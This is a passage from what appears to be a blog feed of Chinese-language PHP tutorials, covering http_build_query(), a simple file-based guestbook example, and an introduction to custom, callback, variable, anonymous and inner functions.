class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token string">"arg=value"</span><span class="token punctuation">[</span><span class="token string">"fragment"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"anchor"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="10-5-http-build-query-函数"><font color="#3CB371" face="Comic sans MS">10.5 http_build_query()函数</font><a href="post/PHP-FileSystem#10-5-http-build-query-函数"></a></h4><blockquote><p><font color="#FF7F00"><strong>功能：生成url 中的query字符串</strong></font></p></blockquote><p><font color="#00B2EE"><strong>string http_build_query ( mixed $需要处理的数据)</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//定义一个关联数组</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>       <span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'php'</span><span class="token punctuation">,</span>       <span class="token string">'area'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'hubei'</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//生成query内容</span><span class="token keyword">echo</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>结果如下：username<span class="token operator">=</span>php<span class="token operator">&amp;</span>area<span class="token operator">=</span>hubei<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注：</strong>PHP_EOL 常量<br>在 windows平台相当于 echo “\r\n”;<br>在unix\linux平台相当于 echo “\n”;<br>在mac平台相当于 echo “\r”;</p></blockquote><p>&emsp;<br>&emsp;</p><h3 id="十一-文件系统实例案例"><font color="#FF6347" face="Comic sans MS">十一. 文件系统实例案例</font><a href="post/PHP-FileSystem#十一-文件系统实例案例"></a></h3><h4 id="11-1-文件留言本"><font color="#3CB371" face="Comic sans MS">11.1 文件留言本</font><a href="post/PHP-FileSystem#11-1-文件留言本"></a></h4><p>先来说两个下面用到的两个字符串函数和一个数组函数：</p><p><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_trim.asp" target="_blank" rel="noopener"><strong>trim()函数</strong></a>]</font>：<strong>移除字符串两侧的空白字符或其他预定义字符。</strong><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_string_explode.asp" target="_blank" rel="noopener"><strong>explode()函数</strong></a>]</font><strong>：把字符串打散为数组。</strong><br><font color="#00B2EE">[<a href="http://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener"><strong>each()函数</strong></a>]</font><strong>：返回当前元素的键名和键值。该元素的键名和键值返回到带有四个元素的数组中。</strong></p><p><font color="#FF7F00"></font></p><p>&emsp;<br><font color="#00B2EE">[<a href="http://www.php.cn/code/4934.html" target="_blank" rel="noopener"><strong>视频教程</strong></a>]</font></p><blockquote><p><font color="#FF7F00"><strong>1. 文件结构：</strong></font><br>index.php —展示输入框和留言内容,并将内容提交到write.php；<br>write.php —接收并处理来自index.php的内容，然后向message.txt写入数据；<br>message.txt —接收并存入来自write.php的聊天内容。</p></blockquote><p>index.php文件：<br><font color="#FF7F00"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?Php</span><span class="token comment" spellcheck="true">//设置时区</span><span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string">'PRC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//读了内容</span>@<span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'message.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果$string 不为空的时候执行，也就是message.txt中有留言数据</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//每一段留言有一个分格符，但是最后多出了一个&amp;^。因此，我们要将&amp;^删掉</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">rtrim</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">,</span> <span class="token string">'&amp;^'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//以&amp;^切成数组</span>    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'&amp;^'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//将留言内容读取</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//将用户名和内容分开</span>        <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$time</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'$#'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'用户名为&lt;font color="gree">'</span> <span class="token punctuation">.</span> <span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/font>内容为&lt;font color="red">'</span> <span class="token punctuation">.</span> <span class="token variable">$content</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/font>时间为'</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'Y-m-d H:i:s'</span><span class="token punctuation">,</span> <span class="token variable">$time</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;hr />'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>基于文件的留言本演示<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>write.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    用户名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>    留言内容：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span>  <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>write.php文件：<br><font color="#FF7F00"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//追加方式打开文件</span><span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'message.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置时间</span><span class="token variable">$time</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到用户名</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到内容</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//组合写入的字符串：内容和用户之间分开，使用$#</span><span class="token comment" spellcheck="true">//行与行之间分开，使用&amp;^</span><span class="token variable">$string</span><span class="token operator">=</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">'$#'</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">'$#'</span><span class="token punctuation">.</span><span class="token variable">$time</span><span class="token punctuation">.</span><span class="token string">'&amp;^'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//写入文件</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//关闭文件</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'location:index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="#00B2EE"><strong>步骤1：</strong></font><strong>在www目录下的index.php里面复制上面相对应的内容、新建一个write.php文件并复制相应的内容、新建一个message.txt空文件；</strong><br><font color="#00B2EE"><strong>步骤2：</strong></font><strong>运行index.php如下：</strong></p><div class="article-img"><p><img src="https://i.loli.net/2019/02/21/5c6e21be78910.png" alt="Hash函数.png" data-zoomable></p></div><p>&emsp;<br><font color="#00B2EE"><strong>步骤3：</strong></font><strong>向留言框输入文字并点击提交</strong></p><p>&emsp;</p><h4 id="11-2-修改配置文件"><font color="#3CB371" face="Comic sans MS">11.2 修改配置文件</font><a href="post/PHP-FileSystem#11-2-修改配置文件"></a></h4><p><font color="#00B2EE">[<a href="http://www.php.cn/code/4935.html" target="_blank" rel="noopener"><strong>视频教程</strong></a>]</font><br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-函数</title>
      <link href="/post/PHP-function/"/>
      <url>/post/PHP-function/</url>
      
        <content type="html"><![CDATA[<p>PHP函数分为<font color="red"><strong>自定义函数</strong></font>和<font color="red"><strong>系统函数</strong></font> (oﾟvﾟ)ノ</p><a id="more"></a><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">PHP 函数</font></center><p>&emsp;<br>&emsp;</p><h3 id="一-自定义函数"><font color="#FF6347" face="Comic sans MS">一. 自定义函数</font><a href="post/PHP-function#一-自定义函数"></a></h3><h4 id="1-1-自定义函数函数基本概念"><font color="#3CB371" face="Comic sans MS">1.1 自定义函数函数基本概念</font><a href="post/PHP-function#1-1-自定义函数函数基本概念"></a></h4><p><font face="Comic sans MS">我们在实际开发过程当中需要有很多功能都需要反复使用到，而这些反复需要使用到的功能，我们能定义成功能（函数），就尽可能定义成功能（函数）。使用的时候，吼一下它的名字即可。<br>  那我们来学一下自定义函数的语法规定，语法规定如下：<br><font color="red"><br>  function 函数名([参数名1[=值1], 参数名2[=值2], 参数名n[=值n]])<br>{<br>       函数中的功能体<br>    [return 返回值]<br>}<br></font><br></font></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**上面的语法规定中发现了如下特点，产生如下语未能规定：**</font>1. 函数以<font color="red">**function**</font>开始2. function后面接空格，空格后接函数名3. 函数名与变量命名规则基本一样，但是不同的是：<font color="red">**函数名不区分大小写**</font>4. 所谓参数其实就是变量5. 函数名后接括号，括号内跟参数，参数全都有[]（中括号）括起来了，代表参数可填可不填6. 如果有参数的话，参数后可以接(＝)等号，等号接默认值。参数值也是用[](中括号)括起来的，代表选填7. 函数后的参数变量，主要功能是把函数体外的变量值，传入函数体内来使用，函数体的变量和函数体外的   变量通常是两个不同的变量。8. 函数中的具体功能（功能体）用大括号括起来，代表这是一个函数的功能区间9. 函数可以有返回值也可以没有返回值，用[]（中括号）括起来的，代表选填。10. return后接空格，空格后接返回值，若有return,return后的代码均不执行。(<font color="red">**return可用可不用**</font>)11. 函数的执行没有顺序关系，可以在定义处之前的位置调用12. 函数不能被定义两次，即函数不能被重载</font></td></tr></table></div></div><p>&emsp;</p><blockquote><p><font color="#00B2EE"><strong>1. 函数是条狗，哪里调用哪里哪，它就跟着你走</strong></font><br><font color="#00B2EE"><strong>2. 函数名只能是字母，数字，下划线的组合，并且之间不能包含空格，数字不能放在变量名首位。</strong></font><br><font color="#00B2EE"><strong>3. 函数名与变量命名规则一样，但是不同的是：</strong><font color="red"><strong>函数名不区分大小写</strong></font> </font><br><font color="#00B2EE"><strong>4. 函数体的参数若是定义了，未传参数，代码会报错</strong></font><br><font color="#00B2EE"><strong>5. 函数的参数如果有默认值，参数可以不填，代码也不会报错</strong></font><br><font color="#00B2EE"><strong>6. 函数的参数可以写多个</strong></font><br><font color="#00B2EE"><strong>7. 函数如果有默认值和无默认值的参数，通常把无默认值的参数写在最前面</strong></font><br><font color="#00B2EE"><strong>8. 函数体的变量与函数体外的变量没有关系</strong></font><br><font color="#00B2EE"><strong>9. 函数体中若有return,return 后的代码不执行</strong></font><br><font color="#00B2EE"><strong>10. 函数执行完后,return 可把函数体内的值，带带函数体外</strong></font><br><font color="#00B2EE"><strong>11. 函数的执行没有顺序关系，可以在定义处之前的位置调用</strong></font><br><font color="#00B2EE"><strong>12. 函数不能重载</strong></font></p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-2-回调函数"><font color="#3CB371" face="Comic sans MS">1.2 回调函数</font><a href="post/PHP-function#1-2-回调函数"></a></h4><p><strong>一个函数作为另外一个函数的</strong><font color="red"><strong>参数</strong></font>。</p><p><font face="Comic sans MS">回调函数，可以配合匿名函数和变量函数实现更加优美、复杂的一种函数结构。<br>回调函数，就是在处理一个功能的时候，我让让这个功能自定义能力再强一些，我准许调用这个函数的时候，还可以传入一个函数配合、协助进行处理。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token keyword">function</span> woziji<span class="token punctuation">(</span><span class="token variable">$one</span>,<span class="token variable">$two</span>,<span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       //我规定：检查<span class="token variable">$func</span>是否是函数，如果不是函数停止执行本段代码，返回false       if<span class="token punctuation">(</span><span class="token operator">!</span>is_callable<span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">))</span><span class="token punctuation">{</span>               <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       //我把<span class="token variable">$one</span>、<span class="token variable">$two</span>相加，再把<span class="token variable">$one</span>和<span class="token variable">$two</span>传入<span class="token variable">$func</span>这个函数中处理一次       //<span class="token variable">$func</span>是一个变量函数，参见变量函数这一章       <span class="token keyword">echo</span> <span class="token variable">$one</span> + <span class="token variable">$two</span> + <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token variable">$one</span>,<span class="token variable">$two</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>//我们定义几个函数试试<span class="token keyword">function</span> plusx2<span class="token punctuation">(</span> <span class="token variable">$foo</span> , <span class="token variable">$bar</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$foo</span>+<span class="token variable">$bar</span><span class="token punctuation">)</span>*2<span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> jian<span class="token punctuation">(</span> <span class="token variable">$x</span> , <span class="token variable">$y</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$x</span> - <span class="token variable">$y</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span>//调用一下函数，woziji，向里面传入参数试试<span class="token keyword">echo</span> woziji<span class="token punctuation">(</span>20,10,<span class="token string">'plusx2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//将plusx2改成jian试试结果<span class="token keyword">echo</span> woziji<span class="token punctuation">(</span>20,10,<span class="token string">'jian'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>处理过程是这样的:</strong><br>    1.将20赋值给形参$one,10赋值给了$two，而plusx2或者jian这两个变量函数，赋值给了$func<br>    2.在woziji这个函数中判断plusx2或者jian是否为函数，不是函数就return false 停止执行了<br>    3.显示plusx2或者jian是函数。因此$one = 20, $two =10相加了，相加后，$one和$two又带入到了了$func($one,$two)中。<br>    4.带入至里面后而$func，是可变的，可以为plusx2或者jian。如果为plusx2的话，$one = 20,$two = 10 的这个两个结果又给        了plusx2函数里面的$foo和$bar<br>    5.$foo + $bar 乘以2后将结果返回至woziji这个函数功能体的运算处：$one + $two + $func($one,$two);<br>    6.这样得到了运算结果<br>现在我们明白了回调函数：在一个调数里面，再传入一个函数名，将函数名加上()括号。识为变量函数，配合执行。</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-3-变量函数"><font color="#3CB371" face="Comic sans MS">1.3 变量函数</font><a href="post/PHP-function#1-3-变量函数"></a></h4><p><font color="red"><strong>function demo(){}<br>$fu = ‘demo’;<br>$fu();</strong><br></font></p><p>&emsp;<br><font face="Comic sans MS">在之前的变量部份，我们学习了可变变量。可变函数仅仅是可变变量的一个变种、变形表达。<br><font color="#00B2EE"><strong>可变函数</strong></font>，我们也会称呼为变量函数。简单回顾一下之前的知识点：<br></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$hello</span> <span class="token operator">=</span> <span class="token string">'world'</span><span class="token punctuation">;</span><span class="token variable">$world</span> <span class="token operator">=</span> <span class="token string">'你好'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出的结果为：你好</span><span class="token keyword">echo</span> $<span class="token variable">$hello</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>因为$hello先被解释成了world，再world前加上$符就输出了：你好。</p></blockquote><p>&emsp;<br>而<font color="#00B2EE"><strong>变量函数</strong></font>的用法是这样的：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">demo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'天王盖地虎'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'小鸡炖蘑菇'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$fu</span> <span class="token operator">=</span> <span class="token string">'demo'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//把$fu变为了demo,把demo后加上了一个括号，就执行函数了</span><span class="token variable">$fu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//把$fu的值改为test字符串再试试？</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-4-匿名函数"><font color="#3CB371" face="Comic sans MS">1.4 匿名函数</font><a href="post/PHP-function#1-4-匿名函数"></a></h4><p><strong>匿名函数，也就是</strong><font color="red"><strong>没有函数名的函数。</strong></font></p><p>匿名函数的第一种用法，直接把赋数赋值给变量，调用变量即为调用函数。<br>匿名函数的写法比较灵活。</p><p><font color="#00B2EE"><strong>1.变量函数式的匿名函数</strong></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$greet</span> <span class="token operator">=</span> function<span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token variable">$name</span><span class="token keyword">.</span><span class="token string">'，你好'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token variable">$greet</span><span class="token punctuation">(</span><span class="token string">'明天'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$greet</span><span class="token punctuation">(</span><span class="token string">'PHP中文网'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>上例中的函数体没有函数名，通过$greent加上括号来调用的，这就是匿名函数。</p></blockquote><p>&emsp;<br><font color="#00B2EE"><strong>2.回调式的匿名函数</strong></font><br>实际使用场景中，我们要通过一个函数实现更多的功能。但是，我又不想专门定义一个函数。我们回顾一下，我们回调函数的例子：</p><p><font face="Comic sans MS"></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token keyword">function</span> woziji<span class="token punctuation">(</span><span class="token variable">$one</span>,<span class="token variable">$two</span>,<span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       //我规定：检查<span class="token variable">$func</span>是否是函数，如果不是函数停止执行本段代码，返回false       if<span class="token punctuation">(</span><span class="token operator">!</span>is_callable<span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">))</span><span class="token punctuation">{</span>               <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       //我把<span class="token variable">$one</span>、<span class="token variable">$two</span>相加，再把<span class="token variable">$one</span>和<span class="token variable">$two</span>传入<span class="token variable">$func</span>这个函数中处理一次       //<span class="token variable">$func</span>是一个变量函数，参见变量函数这一章       <span class="token keyword">echo</span> <span class="token variable">$one</span> + <span class="token variable">$two</span> + <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token variable">$one</span>,<span class="token variable">$two</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>woziji<span class="token punctuation">(</span>20,30,function<span class="token punctuation">(</span> <span class="token variable">$foo</span> , <span class="token variable">$bar</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$foo</span>+<span class="token variable">$bar</span><span class="token punctuation">)</span>*2<span class="token punctuation">;</span>               <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>仔细推理一下过程哟。只不过在之前的章节当中，plusx2换成了我们的匿名函数：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?phpfunction<span class="token punctuation">(</span> <span class="token variable">$foo</span> , <span class="token variable">$bar</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$foo</span>+<span class="token variable">$bar</span><span class="token punctuation">)</span>*2<span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>因此，函名函数在调用的时候没有函数名。我们可以采用以上的一些方法来使用匿名函数。</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-5-内部函数"><font color="#3CB371" face="Comic sans MS">1.5 内部函数</font><a href="post/PHP-function#1-5-内部函数"></a></h4><p><strong>内部函数，是指</strong><font color="red"><strong>在函数内部又声明了一个函数。</strong></font></p><p><font face="Comic sans MS"><strong>注意事项：</strong></font></p><ol><li>内部函数名，不能是已存在的函数名</li><li>假设在函数a里面定义了一个内部函数，不能定用两次函数a。</li></ol><p>我们下面来看代码，你将很快的学习会：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token keyword">function</span> foo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'我是函数foo哟，调一下我才会执行定义函数bar的过程&lt;br />'</span><span class="token punctuation">;</span> <span class="token keyword">function</span> bar<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token string">'在foo函数内部有个函数叫bar函数&lt;br />'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>//现在还不能调用bar<span class="token punctuation">(</span><span class="token punctuation">)</span>函数，因为它还不存在//bar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //如果现在调用会报错foo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//现在可以调用bar<span class="token punctuation">(</span><span class="token punctuation">)</span>函数了，因为foo<span class="token punctuation">(</span><span class="token punctuation">)</span>函数的执行使得bar<span class="token punctuation">(</span><span class="token punctuation">)</span>函数变为已定义的函数bar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//再调一次foo<span class="token punctuation">(</span><span class="token punctuation">)</span>看看是不是会报错？  会报错foo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>仔细观察和实验后你会得出如下的结论：<br>   1.foo()调用两次会报错<br>   2.如果不调foo()函数无法执行bar函数，因为bar是在foo的内部</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-6-参数的引用"><font color="#3CB371" face="Comic sans MS">1.6 参数的引用</font><a href="post/PHP-function#1-6-参数的引用"></a></h4><p>在变量这个函数中，我们学习了变量的引用，我们来回顾一下知识：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token 